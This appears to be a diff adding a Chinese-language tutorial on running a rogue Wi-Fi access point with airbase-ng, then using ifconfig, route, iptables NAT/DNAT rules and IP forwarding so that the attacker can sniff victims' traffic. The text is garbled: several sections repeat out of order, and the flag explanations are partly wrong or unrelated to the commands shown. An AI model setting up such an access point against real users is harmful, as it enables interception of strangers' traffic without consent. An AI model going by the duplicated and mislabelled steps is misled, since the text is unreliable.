@@ -1,0 +1,169 @@
+
+`echo` 值：
+
+| Value | 描述 |
+|-------|-------------|
+| 0 | 禁用 ipv4 转发 |
+| 1 | 启用 ipv4 转发 |
+
+`iptables` 规则不是持久的。
+在 `at0` 接口分配 IP 地址和子网掩码后，我们将使用以太网接口 (`eth0`)。这将允许我们在虚拟机内部访问互联网，并将所有客户端流量通过自身路由。简而言之，允许受害者访问互联网，并允许我们（攻击者）嗅探受害者的流量。
+我们将使用 `iptables` 工具设置防火墙规则，将所有流量路由通过此特定接口。
+
+### 命令拆解：
+
+```
+--deauth 0: 无限制取消认证请求。
+-a: 目标 MAC 地址。
+-b: 源 MAC 地址。
+-c: 通道数。
+-s: 持续时间。
+-t: 协议类型。
+-p: 协议。
+-dport: 目标端口。
+-d: 目标 IP。
+-w: 等待时间。
+-i: 接口名称。
+-j: 动作。
+```
+
+### 攻击演示：
+
+使用 `airbase-ng` 创建接入点后，你会看到输出：
+
+```
+03:58:11 创建 tap interface at0
+03:58:11 尝试将 at0 的 MTU 设置为 1500
+03:58:11 尝试将 wlanmon 的 MTU 设置为 1800
+03:58:11 SSID 为 00:C0:CA:5A:34:B6 的接入点已启动
+```
+
+默认情况下，`airbase-ng` 会创建一个 tap 接口 (`at0`) 作为虚拟接口，通过伪造接入点桥接/路由网络流量。使用 `config at0` 进行检查。
+
+```
+at0: flags=BROADCAST,MULTICAST; mtu 1500
+ether 00:c0:ca:5a:34:b6 txqueuel 1000 (Ethernet)
+RX packets 0 bytes (0.0 B)
+RX errors 0 dropped overflows 0 frame 0
+TX packets 0 bytes (0.0 B)
+TX errors 0 dropped overflows 0 carrier 0 collisions 0
+```
+
+为了让 `at0` 为受害者分配 IP 地址，你首先需要给自己分配 IP 范围。
+
+```
+ifconfig at0 10.0.0.1 netmask 255.255.255.0
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+```
+
+我们为 `at0` 接口分配了类 A IP 地址。
+`route` 命令已将 `10.0.0.0` 设置为网络地址，`255.255.255.0` 为子网掩码，`10.0.0.1` 为默认网关（即 `at0` 的 IP）。
+
+> 不要混淆网络地址和默认网关。网络地址也称为网络节点。节点是任何特定范围的预留 IP 地址。“X.X.X.0”和“X.X.255” 总是被保留的，这意味着 IP 范围从 X.X.X.1-254。
+
+在 `at0` 接口分配 IP 地址和子网掩码后，我们将使用以太网接口 (`eth0`)。这将允许我们在虚拟机内部访问互联网，并将所有客户端流量通过自身路由。简而言之，允许受害者访问互联网，并允许我们（攻击者）嗅探受害者的流量。
+我们将使用 `iptables` 工具设置防火墙规则，将所有流量路由通过此特定接口。
+
+检查默认接口的 IP 地址。
+
+如果你使用虚拟机，将得到类似的输出：
+
+```
+ip route
+default via 192.168.2.2 dev eth0
+192.168.2.0/24 dev eth proto kernel link src 192.168.2.129
+```
+
+在这种情况下，默认接口的 IP 地址是 `192.168.2.129`，你的可能有所不同。
+
+## 在 Iptables 中设置防火墙规则
+
+使用 `iptables` 定义入站和出站流量路径：
+
+```
+iptables --table nat -append POSTROUTING --out-interface eth0 -j MASQUERADE
+iptables -append FORWARD --in-interface at0 -j ACCEPT
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --destination 192.168.2.129
+iptables -t nat -A POSTROUTING -j MASQUERADE
+```
+
+确保在第三条命令的“to-destination”之后输入你的 `eth0` IP 地址。剩下的你自己操作。
+别担心，我们将在接下来的章节中详细讨论这些命令的含义。
+在输入上述命令后，如果你愿意为受害者提供互联网访问，启用 ipv4 转发。
+
+### 启用 IP 转发
+
+```
+echo 1 > /proc/sys/net/ipv4/ip_forward
+```
+
+`echo` 值：
+
+| Value | 描述 |
+|-------|-------------|
+| 0 | 禁用 ipv4 转发 |
+| 1 | 启用 ipv4 转发 |
+
+`iptables` 规则不是持久的。
+在 `at0` 接口分配 IP 地址和子网掩码后，我们将使用以太网接口 (`eth0`)。这将允许我们在虚拟机内部访问互联网，并将所有客户端流量通过自身路由。简而言之，允许受害者访问互联网，并允许我们（攻击者）嗅探受害者的流量。
+我们将使用 `iptables` 工具设置防火墙规则，将所有流量路由通过此特定接口。
+
+### 攻击演示：
+
+使用 `airbase-ng` 创建接入点后，你会看到输出：
+
+```
+03:58:11 创建 tap interface at0
+03:58:11 尝试将 at0 的 MTU 设置为 1500
+03:58:11 尝试将 wlanmon 的 MTU 设置为 1800
+03:58:11 SSID 为 00:C0:CA:5A:34:B6 的接入点已启动
+```
+
+默认情况下，`airbase-ng` 会创建一个 tap 接口 (`at0`) 作为虚拟接口，通过伪造接入点桥接/路由网络流量。使用 `config at0` 进行检查。
+
+```
+at0: flags=BROADCAST,MULTICAST; mtu 1500
+ether 00:c0:ca:5a:34:b6 txqueuel 1000 (Ethernet)
+RX packets 0 bytes (0.0 B)
+RX errors 0 dropped overflows 0 frame 0
+TX packets 0 bytes (0.0 B)
+TX errors 0 dropped overflows 0 carrier 0 collisions 0
+```
+
+为了让 `at0` 为受害者分配 IP 地址，你首先需要给自己分配 IP 范围。
+
+```
+ifconfig at0 10.0.0.1 netmask 255.255.255.0
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+```
+
+我们为 `at0` 接口分配了类 A IP 地址。
+`route` 命令已将 `10.0.0.0` 设置为网络地址，`255.255.255.0` 为子网掩码，`10.0.0.1` 为默认网关（即 `at0` 的 IP）。
+
+> 不要混淆网络地址和默认网关。网络地址也称为网络节点。节点是任何特定范围的预留 IP 地址。“X.X.X.0”和“X.X.255” 总是被保留的，这意味着 IP 范围从 X.X.X.1-254。
+
+在 `at0` 接口分配 IP 地址和子网掩码后，我们将使用以太网接口 (`eth0`)。这将允许我们在虚拟机内部访问互联网，并将所有客户端流量通过自身路由。简而言之，允许受害者访问互联网，并允许我们（攻击者）嗅探受害者的流量。
+我们将使用 `iptables` 工具设置防火墙规则，将所有流量路由通过此特定接口。
+
+### 配置网络
+
+### 启动伪接入点
+
+使用 `airbase-ng` 创建接入点：
+`airbase-ng -e "rootsh311" -c 1 wlanmon`
+
+```
+03:58:11 创建 tap interface at0
+03:58:11 尝试将 at0 的 MTU 设置为 1500
+03:58:11 尝试将 wlanmon 的 MTU 设置为 1800
+03:58:11 SSID 为 00:C0:CA:5A:34:B6 的接入点已启动
+```
+
+默认情况下，`airbase-ng` 会创建一个 tap 接口 (`at0`) 作为虚拟接口，通过伪造接入点桥接/路由网络流量。使用 `config at0` 进行检查。
+
+```
+at0: flags=BROADCAST,MULTICAST; mtu 1500
+ether 00:c0:ca:5a:34:b6 txqueuel 1000 (Ethernet)
+RX packets 0 bytes (0.0 B)
+RX errors 0 dropped overflows 0 frame 0
+```
